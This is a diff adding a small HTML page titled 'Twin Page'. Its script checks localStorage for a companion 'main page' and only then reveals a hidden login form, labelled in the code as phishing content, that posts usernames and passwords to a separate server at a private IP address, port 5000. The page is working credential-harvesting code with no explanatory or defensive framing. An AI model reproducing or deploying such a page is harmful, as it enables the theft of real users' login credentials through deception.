@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Twin Page</title>
+    <script>
+        function markTwinPageOpen() {
+            window.name = 'twin';
+            localStorage.setItem('twinPageOpened', 'true');
+        }
+
+        function checkMainPage() {
+            if (localStorage.getItem('mainPageOpened') === 'true') {
+                localStorage.setItem('showPhishing', 'true');
+                document.getElementById('phishing-content').style.display = 'block';
+            } else {
+                document.getElementById('phishing-content').style.display = 'none';
+                localStorage.removeItem('showPhishing');
+            }
+        }
+
+        function checkPhishingDisplay() {
+            if (localStorage.getItem('showPhishing') === 'true') {
+                document.getElementById('phishing-content').style.display = 'block';
+            } else {
+                document.getElementById('phishing-content').style.display = 'none';
+            }
+        }
+
+        window.onload = function() {
+            markTwinPageOpen();
+            checkMainPage();
+            window.onbeforeunload = function() {
+                localStorage.removeItem('twinPageOpened');
+                localStorage.removeItem('showPhishing');
+            };
+        };
+
+        setInterval(checkPhishingDisplay, 1000);
+    </script>
+</head>
+<body>
+    <h1>Welcome to the Twin Page</h1>
+    <div id="phishing-content" style="display:none;">
+        <form action="http://192.168.0.189:5000" method="post">
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username"><br>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password"><br>
+            <input type="submit" value="Login">
+        </form>
+    </div>
+</body>
+</html>
